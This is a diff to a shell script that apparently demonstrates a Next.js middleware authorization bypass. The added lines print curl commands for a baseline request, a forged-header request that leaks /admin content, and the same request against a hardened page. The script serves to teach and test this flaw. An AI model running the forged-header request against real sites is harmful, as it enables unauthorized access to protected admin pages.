@@ -81,6 +81,9 @@ hit() {
 ver=$(node -e 'console.log(require("next/package.json").version)' 2>/dev/null || echo '?')
 echo "Next.js: $ver     Target: $BASE"
 echo "=================================================================="
+echo "(Each step prints the curl command you can run yourself. 'curl -i'"
+echo " shows status+headers+HTML; this script tidies that to the status"
+echo " line + a one-line proof so it stays readable on screen.)"
 
 # -----------------------------------------------------------------------------
 # [1] BASELINE — the app works as intended for an honest user.
@@ -89,6 +92,7 @@ echo "=================================================================="
 # -----------------------------------------------------------------------------
 echo
 echo "[1] Honest user, NO session cookie      GET /admin"
+echo "    \$ curl -i $BASE/admin"
 hit "$BASE/admin"
 echo "    expected: 307 -> /login   (middleware redirects)"
 
@@ -100,6 +104,7 @@ echo "    expected: 307 -> /login   (middleware redirects)"
 # -----------------------------------------------------------------------------
 echo
 echo "[2] Attacker forges the header          GET /admin   (+ forged header)"
+echo "    \$ curl -i -H \"$FORGED\" $BASE/admin"
 hit "$BASE/admin" -H "$FORGED"
 if grep -q "Welcome, authenticated admin" "$TMP/body"; then
   # The protected content leaked into the response -> the bypass worked.
@@ -119,6 +124,7 @@ fi
 # -----------------------------------------------------------------------------
 echo
 echo "[3] Same attack vs hardened page        GET /admin-secure   (+ forged header)"
+echo "    \$ curl -i -H \"$FORGED\" $BASE/admin-secure"
 hit "$BASE/admin-secure" -H "$FORGED"
 echo "    expected: 307 -> /login   (in-page check holds even if middleware is skipped)"
 echo
